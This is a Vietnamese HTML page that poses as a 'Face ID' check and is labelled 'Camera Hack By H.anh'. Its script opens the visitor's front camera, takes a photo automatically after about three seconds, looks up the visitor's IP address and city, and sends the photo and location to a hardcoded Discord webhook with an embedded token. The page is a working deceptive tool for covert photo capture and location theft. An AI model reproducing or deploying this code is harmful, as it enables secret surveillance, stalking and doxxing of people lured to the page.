<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>KIỂM TRA FACE ID</title>
    <style>
        body {
            margin: 0; padding: 0;
            background: #000;
            color: #fff;
            font-family: system-ui, -apple-system, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        .container {
            text-align: center;
            width: 100%;
            max-width: 480px;
            padding: 20px;
        }
        h1 {
            color: #ff4d4d;
            font-size: 1.8rem;
            margin: 10px 0 30px;
        }
        #video-container {
            width: 100%;
            max-width: 360px;
            margin: 0 auto 20px;
            border: 4px solid #00ff9d;
            border-radius: 16px;
            overflow: hidden;
            background: #111;
        }
        video {
            width: 100%;
            display: block;
        }
        #status {
            font-size: 1.3rem;
            font-weight: 600;
            padding: 16px;
            background: rgba(255, 77, 77, 0.15);
            border-radius: 12px;
            min-height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .alert-box {
            display: none;
            background: #1a1a1a;
            border: 2px solid #ff4d4d;
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>🔎 KIỂM TRA FACE ID</h1>
    
    <div id="video-container">
        <video id="video" autoplay playsinline muted></video>
    </div>
    
    <div id="status">Đang mở camera...</div>

    <div id="alert-box" class="alert-box">
        <div style="background:#ff4d4d; color:white; padding:12px; border-radius:8px; font-weight:bold; margin-bottom:15px;">
            ⚠️ KHÁCH TRUY CẬP MỚI
        </div>
        <div style="text-align:left; line-height:1.8;">
            <div><strong>IP:</strong> <span id="ip">Đang lấy...</span></div>
            <div><strong>Thành phố:</strong> <span id="city">Đang lấy...</span></div>
            <div><strong>Khu vực:</strong> <span id="region">Đang lấy...</span></div>
            <div><strong>Thiết bị:</strong> <span id="device">Mobile</span></div>
            <div><strong>Thời gian:</strong> <span id="time"></span></div>
        </div>
        <p style="margin-top:25px; color:#888; font-size:0.95rem;">
            Camera Hack By H.anh • Gửi tự động về Discord
        </p>
    </div>
</div>

<script>
// ================== WEBHOOK ĐÃ ĐƯỢC ĐIỀN SẴN ==================
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1487644219945390160/FNtkSqJw4J-4md6mgXJpfwdCsX8pcWn72BEd6snufQKxCNzJzGL5HVzdgknp9L9-cCbM";

let streamGlobal = null;

async function startCamera() {
    const status = document.getElementById('status');
    const video = document.getElementById('video');

    try {
        status.textContent = "⏳ Đang yêu cầu quyền camera...";

        const constraints = {
            video: {
                facingMode: "user",
                width: { ideal: 640, max: 1280 },
                height: { ideal: 480, max: 720 }
            }
        };

        streamGlobal = await navigator.mediaDevices.getUserMedia(constraints);
        
        video.srcObject = streamGlobal;
        status.textContent = "✅ Camera đã mở. Tự động chụp sau 3 giây...";

        setTimeout(() => captureAndSend(), 3200);   // 3.2 giây

    } catch (err) {
        console.error(err);
        let msg = "❌ Không mở được camera.";
        
        if (err.name === "NotAllowedError") 
            msg = "❌ Bạn đã từ chối quyền camera.\nHãy cho phép và tải lại trang.";
        else if (err.name === "NotReadableError") 
            msg = "❌ Camera đang bị dùng bởi app khác.";
        
        status.innerHTML = msg + "<br><small>Thử tải lại hoặc kiểm tra quyền camera trong trình duyệt.</small>";
    }
}

async function captureAndSend() {
    const video = document.getElementById('video');
    if (!streamGlobal) return;

    streamGlobal.getTracks().forEach(track => track.stop());

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

    // Chuyển sang màn hình cảnh báo
    document.getElementById('video-container').style.display = 'none';
    document.getElementById('alert-box').style.display = 'block';
    document.getElementById('status').style.display = 'none';

    document.getElementById('time').textContent = new Date().toLocaleString('vi-VN');

    // Lấy IP + vị trí
    let ipInfo = { ip: "Không lấy được", city: "Vinh", region: "Nghệ An" };
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        ipInfo.ip = data.ip || ipInfo.ip;
        ipInfo.city = data.city || ipInfo.city;
        ipInfo.region = data.region || ipInfo.region;
    } catch (e) {}

    document.getElementById('ip').textContent = ipInfo.ip;
    document.getElementById('city').textContent = ipInfo.city;
    document.getElementById('region').textContent = ipInfo.region;

    // Gửi về Discord
    sendToDiscord(canvas, ipInfo);
}

async function sendToDiscord(canvas, ipInfo) {
    try {
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.82));
        const formData = new FormData();

        const payload = {
            username: "Camera Hack By H.anh",
            content: `📸 **Ảnh chụp tự động**\n` +
                     `⏰ ${new Date().toLocaleString('vi-VN')}\n` +
                     `🌐 IP: ${ipInfo.ip}\n` +
                     `📍 ${ipInfo.city}, ${ipInfo.region} - VN`
        };

        formData.append('payload_json', JSON.stringify(payload));
        formData.append('file', blob, `face_${Date.now()}.jpg`);

        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
        console.log("✅ Đã gửi ảnh + thông tin về Discord thành công");
    } catch (e) {
        console.error("Gửi Discord lỗi:", e);
    }
}

// Khởi động khi load trang
window.addEventListener('load', () => {
    if (location.protocol !== 'https:' && !location.hostname.includes('localhost')) {
        document.getElementById('status').innerHTML = "⚠️ Phải chạy trên HTTPS mới dùng được camera.";
        return;
    }
    startCamera();
});
</script>
</body>
</html>
